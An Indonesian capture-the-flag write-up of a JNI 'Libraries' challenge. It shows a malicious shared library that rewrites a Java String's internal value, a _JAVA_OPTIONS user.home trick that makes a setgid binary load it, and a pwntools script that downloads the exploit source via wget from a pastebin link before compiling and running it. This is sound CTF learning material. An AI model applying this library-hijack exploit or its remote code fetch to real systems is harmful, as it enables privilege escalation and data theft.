# Libraries (70 Points)
Hey! I just learned how to incorporate C++ code into Java through JNI! I created a simple library in C and imported into Java. Although, who cares about a security hole and portability when this is so much fun? Run: <code>ssh lib@104.131.79.111 -p 1001 (pw: guest)</code>. <br>
Hint: Are strings always immutable?
# Solved
Disini kita diberikan sebuah akses untuk koneksi pada <b>ssh</b>. Kemudian saat saya cek file dalam dir tersebut
```
lib@ubuntu-512mb-nyc3-01:~$ ls -al
total 56
dr-xr-xr-x  3 root root     4096 Oct  2  2017 .
drwxr-xr-x 19 root root     4096 Nov 22  2019 ..
-r--r-----  1 root lib_pwn    24 Sep  6  2017 flag.txt
-r--r--r--  1 root root      359 Sep  6  2017 hellolib.c
-r-xr-sr-x  1 root lib_pwn 14352 Oct  2  2017 hellotest
-r--r--r--  1 root root     2407 Oct  2  2017 hellotest.cpp
dr-xr-xr-x  2 root root     4096 Sep  8  2017 .helloWorld
-r--r--r--  1 root root      403 Mar 28  2017 Helloworld.h
-r--r--r--  1 root root     3860 Oct  2  2017 Helloworld.jar
-r--r--r--  1 root root     1934 Sep  8  2017 Helloworld.java
-r--r--r--  1 root root      589 Sep  6  2017 Makefile
```
hellolib.c
```cpp
#include <jni.h>
#include <stdlib.h>
#include <stdio.h>
#include "Helloworld.h"

JNIEXPORT void JNICALL Java_Helloworld_print
  (JNIEnv* env, jclass cls, jstring msg)
{
    const char* str = (*env)->GetStringUTFChars(env, msg, 0);
    printf("%s\n", str);
    if (str)
        (*env)->ReleaseStringUTFChars(env, msg, str);
    fflush(stdout);
}
```
hellotest.cpp
```cpp
#include <jni.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <unistd.h>

using namespace std;

typedef jint (*P_JNI_CreateJavaVM) (JavaVM **, void **, void *);

int main()
{

    FILE * pFile = fopen("flag.txt", "r");
    if (!pFile)
    {
        cerr << "Unable to read flag." << endl;
        exit(1);
    }

    char buff[100];
    if (!fgets(buff, sizeof(buff), pFile))
    {
        cerr << "Unable to read flag.." << endl;
        exit(1);
    }

    setresgid(getgid(), getgid(), getgid());

    JavaVM *jvm;       /* denotes a Java VM */
    JNIEnv *env;       /* pointer to native method interface */
    P_JNI_CreateJavaVM createVM; /* function pointer to create JVM */

    /* JDK/JRE 6 VM initialization arguments */
    JavaVMInitArgs vm_args;
    JavaVMOption* options = new JavaVMOption[1];
    options[0].optionString = (char*)"-Djava.class.path=/home/lib/Helloworld.jar";
    vm_args.version = JNI_VERSION_1_6;
    vm_args.nOptions = 1;
    vm_args.options = options;
    vm_args.ignoreUnrecognized = false;

    /* Open jvm library */
    void* hJVM = dlopen("/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/amd64/server/libjvm.so", RTLD_LAZY);
    if (!hJVM)
    {
        cerr << "Unable to load JVM Library." << endl;
        exit(1);
    }

    createVM = (P_JNI_CreateJavaVM) dlsym(hJVM, "JNI_CreateJavaVM");
    if (dlerror() != NULL)
    {
        cerr << "Unable to load JVM Library." << endl;
        exit(1);
    }

    /* load and initialize a Java VM, env is returned as a pointer*/
    (*createVM)(&jvm, (void**)&env, &vm_args);

    delete options;

    /* Invoke the Helloworld.sayHello method using the JNI */
    jclass cls = env->FindClass("Helloworld");
    if (env->ExceptionCheck())
    {
        env->ExceptionDescribe();
        exit(2);
    }
    jmethodID mthHello = env->GetStaticMethodID(cls, "sayHello", "(Ljava/lang/String;)V");
    if (env->ExceptionCheck())
    {
        env->ExceptionDescribe();
        exit(2);
    }
    jstring flag = env->NewStringUTF(buff);
    env->CallStaticVoidMethod(cls, mthHello, flag);
    if (env->ExceptionCheck())
    {
        env->ExceptionDescribe();
        exit(2);
    }

    /* Clean up */
    jvm->DestroyJavaVM();
    dlclose(hJVM);
    exit(0);
}
```
helloworld.h
```cpp
/* DO NOT EDIT THIS FILE - it is machine generated */
#include <jni.h>
/* Header for class Helloworld */

#ifndef _Included_Helloworld
#define _Included_Helloworld
#ifdef __cplusplus
extern "C" {
#endif
/*
 * Class:     Helloworld
 * Method:    print
 * Signature: (Ljava/lang/String;)V
 */
JNIEXPORT void JNICALL Java_Helloworld_print
  (JNIEnv *, jclass, jstring);

#ifdef __cplusplus
}
#endif
#endif
```
Helloworld.java
```java
/**
 * Helloworld.java
 *
 * This tests out my new library via JNI.
 * @author theKidOfArcrania
 */

import java.io.File;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Scanner;

public class Helloworld
{
    static
    {
        try
        {
            loadingLibrary();
        }
        catch (Exception e)
        {
            System.err.println("Unable to load library...");
        }
    }

    public static void sayHello(String flag) throws Exception
    {
        String msg = "Hello World from JNI!";
        print(msg);
        if (msg.contains("flag"))
        {
            //What just happened?
            print("What the flag? How did that happen...");
            print("Your flag is: " + flag);
        }
    }

    /**
    * Loads the helloworld library into java.
    */
    private static void loadingLibrary() throws Exception
    {
        Path libFolder = Paths.get(System.getProperty("user.home"), ".helloWorld");

        //Create user folder to copy libraries from jar file.
        if (!Files.exists(libFolder))
            Files.createDirectory(libFolder);

        //Copy library from jar file into user folder
        Path libDest = libFolder.resolve("libhello.so");
        try
        {
        //Copy libhello if not already there.
            Files.copy(ClassLoader.getSystemResourceAsStream("libhello.so"), libDest);
        }
        catch (Exception e)
        {
            //i don't know why this is throwing an error...
            //i think this fixes it...
        }

        //Dynamically link to it.
        System.load(libDest.toString());
    }

    /**
    * This method prints out the message on standard output.
    * @param msg the message to print out.
    */
    private static native void print(String msg);
}
```
Disini saya belajar cara exploit melalui <b>JNI</b>. Kita cek kembali pada kode java tersebut
```java
if (msg.contains("flag"))
{
    //What just happened?
    print("What the flag? How did that happen...");
    print("Your flag is: " + flag);
}
```
Jika kita berhasil memberikan inputan <b>flag</b>, maka kita akan diberikan flag yang berada pada file .txt tersebut, tapi bagaimana ?. Pada file <b>Makefile</b> terdapat sebuah perintah untuk build code tersebut
```
edit: libhello.so hellotest.o Helloworld.class
        g++ hellotest.o -L/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/amd64/server -ljvm -ldl -o hellotest
        jar cf Helloworld.jar Helloworld.class libhello.so
        rm hellotest.o libhello.so hellolib.o Helloworld.class

libhello.so : hellolib.o
        cc hellolib.o -shared -o libhello.so
Helloworld.class : Helloworld.java
        javac Helloworld.java
hellotest.o : hellotest.cpp
        g++ -c -I/usr/lib/jvm/java-8-openjdk-amd64/include hellotest.cpp
hellolib.o : hellolib.c Helloworld.h
        cc  -c -I/usr/lib/jvm/java-8-openjdk-amd64/include -fpic hellolib.c
```
Setelah saya analisa bahwa pada shell tersebut, kita diberikan akses untuk <b>Mengcompile</b> file <b>.c / .cpp</b>.
```cpp
/* JDK/JRE 6 VM initialization arguments */
JavaVMInitArgs vm_args;
JavaVMOption* options = new JavaVMOption[1];
options[0].optionString = (char*)"-Djava.class.path=/home/lib/Helloworld.jar";
vm_args.version = JNI_VERSION_1_6;
vm_args.nOptions = 1;
vm_args.options = options;
vm_args.ignoreUnrecognized = false;
```
Disisi lain, kita dapat mengkontrol environment pada Java Virtual Machine tersebut menggunakan perintah <b>_JAVA_OPTIONS</b> dengan value <b>-Duser.home=*directory*</b>. Sebelumnya, pada JVM tersebut melakukan Load Binary pada file <b>libhello.so</b>. <i><b>*dir*/.helloWorld/libhello.so</b></i>
```java
private static void loadingLibrary() throws Exception
{
    Path libFolder = Paths.get(System.getProperty("user.home"), ".helloWorld");

    //Create user folder to copy libraries from jar file.
    if (!Files.exists(libFolder))
        Files.createDirectory(libFolder);

    //Copy library from jar file into user folder
    Path libDest = libFolder.resolve("libhello.so");
    try
    {
    //Copy libhello if not already there.
        Files.copy(ClassLoader.getSystemResourceAsStream("libhello.so"), libDest);
    }
    catch (Exception e)
    {
        //i don't know why this is throwing an error...
        //i think this fixes it...
    }

    //Dynamically link to it.
    System.load(libDest.toString());
}
```
Pada file libhello tersebut bisa kita modifikasi value dari variabel <b>msg</b> dan mengcompile file tersebut.
# Solved 2
Disini saya membuat folder baru di /tmp dikarenakan kita memiliki akses pada folder tersebut
```console
mkdir /tmp/chokocheng
```
Kemudian copy semua file yang ada pada folder <b>~</b>
```
lib@ubuntu-512mb-nyc3-01:/tmp/chokocheng$ cp ~/* ./
cp: cannot open '/home/lib/flag.txt' for reading: Permission denied
lib@ubuntu-512mb-nyc3-01:/tmp/chokocheng$ dir
hellolib.c  hellotest  hellotest.cpp  Helloworld.h  Helloworld.jar  Helloworld.java  Makefile
```
Kemudian saya modifikasi <b>hellolib.c</b> untuk menginject JNI tersebut.
```cpp
#include <jni.h>
#include <stdlib.h>
#include <stdio.h>
#include "Helloworld.h"

JNIEXPORT void JNICALL Java_Helloworld_print
  (JNIEnv* env, jclass cls, jstring msg)
{
    const char* str = (*env)->GetStringUTFChars(env, msg, 0);
    printf("%s\n", str);
    if (str)
        (*env)->ReleaseStringUTFChars(env, msg, str);
    fflush(stdout);
}
```
Untuk compilenya sudah di sediakan perintahnya
```
cc  -c -I/usr/lib/jvm/java-8-openjdk-amd64/include -fpic hellolib.c
```
<i>Disini saya tidak tahu cara memodifikasi variabel <b>msg</b>, Kemudian saya bertanya salah satu penyelesai dari challenge ini dan memberikan saya kodenya.</i>
```cpp
#include <jni.h>
#include <stdlib.h>
#include <stdio.h>
#include "Helloworld.h"

JNIEXPORT void JNICALL Java_Helloworld_print
  (JNIEnv* env, jclass cls, jstring msg)
{
    const char* str = (*env)->GetStringUTFChars(env, msg, 0);
    printf("%s\n", str);
    if (str)
        (*env)->ReleaseStringUTFChars(env, msg, str);
    fflush(stdout);

    jclass class = (*env)->GetObjectClass(env, msg);
    jcharArray flag = (*env)->NewCharArray(env, 4);
    jchar* bytes = (*env)->GetCharArrayElements(env, flag, 0);
    bytes[0] = 'f';
    bytes[1] = 'l';
    bytes[2] = 'a';
    bytes[3] = 'g';
    (*env)->SetCharArrayRegion(env, flag, 0, 4, bytes);
    jfieldID field_id = (*env)->GetFieldID(env, class, "value", "[C");
    (*env)->SetObjectField(env, msg, field_id, flag);
}
```
Dikarenakan akses denied saat mengubah file hellolib.c, saya membuat file baru yang bernama <b>exploit.c</b> dan mengisi kode yang diatas. Kemudian saya compile
```console
$ cc -c -I/usr/lib/jvm/java-8-openjdk-amd64/include -fpic exploit.c
$ cc exploit.o -shared -o exploit.so
```
Pindah <b>exploit.so</b> tersebut ke folder .helloWorld
```console
$ mkdir .helloWorld
$ mv exploit.so .helloWorld/
$ mv exploit.so libhello.so
$ cd ~
```
Kemudian jalankan perintah
```console
$ _JAVA_OPTIONS=-Duser.home=/tmp/chokocheng ./hellotest
Picked up _JAVA_OPTIONS: -Duser.home=/tmp/chokocheng
Hello World from JNI!
What the flag? How did that happen...
Your flag is: CTF{JN1_1s_r3a77y_f4n!}
```
Emg rada ribet cara menjelaskannya, tapi disini saya secara pribadi belajar exploit JNI :D. Dan disini saya membuat python code yang untuk memudahkan penyelesaian
```python
from pwn import *
import string
import random
import time

charset = string.ascii_letters
env = ""
for x in range(8):
    env += charset[random.randint(0, len(charset) - 1)]

log.info("Target Environtment : /tmp/" + env)

con = ssh(
    host="104.131.79.111",
    port=1001,
    user="lib",
    password="guest"
)

sh = con.process('/bin/sh')

# Creating dir
log.info("Create dir for exploit")
sh.sendline("mkdir /tmp/" + env)
sh.sendline("mkdir /tmp/" + env + "/.helloWorld")

log.info("Copy all file in real dir")
sh.sendline("cp ./* /tmp/" + env)

# Change Dir
log.info("Change directory")
sh.sendline("cd /tmp/" + env)

# Creating exploit
log.info("Download our exploit")
sh.sendline("wget https://pastebin.com/raw/VV9vqkHY -O /tmp/" + env + "/exploit.c")

# Build
log.info("Build exploit")
sh.sendline("cc -c -I/usr/lib/jvm/java-8-openjdk-amd64/include -fpic /tmp/" + env + "/exploit.c")

log.info("Convert into shared binary")
sh.sendline("cc /tmp/" + env + "/exploit.o -shared -o /tmp/" + env + "/exploit.so")

# Move out
log.info("Move exploit into dir .helloWorld")
sh.sendline("mv /tmp/" + env + "/exploit.so /tmp/" + env + "/.helloWorld/libhello.so")

# Change Dir
log.info("Change directory into home dir")
sh.sendline("cd /home/lib")

# Rename
log.info("Running service... _JAVA_OPTIONS=-Duser.home=/tmp/" + env + " ./hellotest")
sh.sendline("_JAVA_OPTIONS=-Duser.home=/tmp/" + env + " ./hellotest")

sh.recvuntil("Your flag is: ")
log.success("\n\n\nWhat the flag? How did that happen...\nYour flag is: " + str(sh.recv()) + "\n\n\nExploit by @T\n\n")

sh.close()
con.close()
```
```python
[*] Target Environtment : /tmp/wXxROdlA
[+] Connecting to 104.131.79.111 on port 1001: Done
[+] Opening new channel: execve(b'/bin/sh', [b'/bin/sh'], os.environ): Done
[*] Create dir for exploit
[*] Copy all file in real dir
[*] Change directory
[*] Download our exploit
[*] Build exploit
[*] Convert into shared binary
[*] Move exploit into dir .helloWorld
[*] Change directory into home dir
[*] Running service... _JAVA_OPTIONS=-Duser.home=/tmp/wXxROdlA ./hellotest
[+]


    What the flag? How did that happen...
    Your flag is: b'CTF{JN1_1s_r3a77y_f4n!}\n'


    Exploit by @T

[*] Closed SSH channel with 104.131.79.111
[*] Closed connection to '104.131.79.111'
```
Flag : <b>CTF{JN1_1s_r3a77y_f4n!}</b>